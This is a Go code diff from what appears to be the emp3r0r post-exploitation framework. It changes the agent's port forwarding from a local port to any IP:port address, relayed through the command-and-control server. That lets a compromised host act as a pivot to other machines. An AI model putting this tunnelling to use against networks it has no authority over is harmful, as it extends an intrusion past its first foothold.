@@ -7,7 +7,6 @@ import (
 	"io"
 	"log"
 	"net"
-	"strconv"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/tun"
@@ -17,7 +16,7 @@ import (
 
 // PortFwdSession manage a port fwd session
 type PortFwdSession struct {
-	ToPort string
+	To     string
 	Conn   *h2conn.Conn
 	Ctx    context.Context
 	Cancel context.CancelFunc
@@ -69,39 +68,37 @@ func Socks5Proxy(op string, port string) (err error) {
 }
 
 // PortFwd port mapping, receive CC's request data then send it to target port on agent
-func PortFwd(toPort, sessionID string) (err error) {
+func PortFwd(to, sessionID string) (err error) {
 	var (
 		session PortFwdSession
 
-		url  = CCAddress + tun.ProxyAPI
-		port int
+		url = CCAddress + tun.ProxyAPI
 
 		// connection
 		conn   *h2conn.Conn
 		ctx    context.Context
 		cancel context.CancelFunc
 	)
-	port, err = strconv.Atoi(toPort)
-	if err != nil {
-		return err
+	if !tun.ValidateIPPort(to) {
+		return fmt.Errorf("Invalid address: %s", to)
 	}
 
 	// request a port fwd
 	// connect CC
 	conn, ctx, cancel, err = ConnectCC(url)
-	log.Printf("PortFwd started: -> %d (%s)", port, sessionID)
+	log.Printf("PortFwd started: -> %s (%s)", to, sessionID)
 
-	go fwdToDport(ctx, cancel, port, sessionID, conn)
+	go fwdToDport(ctx, cancel, to, sessionID, conn)
 
 	defer func() {
 		cancel()
 		conn.Close()
 		delete(PortFwds, sessionID)
-		log.Printf("PortFwd stopped: -> %d (%s)", port, sessionID)
+		log.Printf("PortFwd stopped: -> %s (%s)", to, sessionID)
 	}()
 
 	// save this session
-	session.ToPort = toPort
+	session.To = to
 	session.Conn = conn
 	session.Ctx = ctx
 	session.Cancel = cancel
@@ -116,22 +113,21 @@ func PortFwd(toPort, sessionID string) (err error) {
 }
 
 func fwdToDport(ctx context.Context, cancel context.CancelFunc,
-	dport int, sessionID string, h2 *h2conn.Conn) {
+	to string, sessionID string, h2 *h2conn.Conn) {
 
 	var err error
 
 	// connect to target port
-	destAddr := fmt.Sprintf("127.0.0.1:%d", dport)
-	dest, err := net.Dial("tcp", destAddr)
+	dest, err := net.Dial("tcp", to)
 	defer func() {
 		cancel()
 		if dest != nil {
 			dest.Close()
 		}
-		log.Printf("fwdToDport %d exited", dport)
+		log.Printf("fwdToDport %s exited", to)
 	}()
 	if err != nil {
-		log.Printf("fwdToDport %d: %v", dport, err)
+		log.Printf("fwdToDport %s: %v", to, err)
 		return
 	}
 
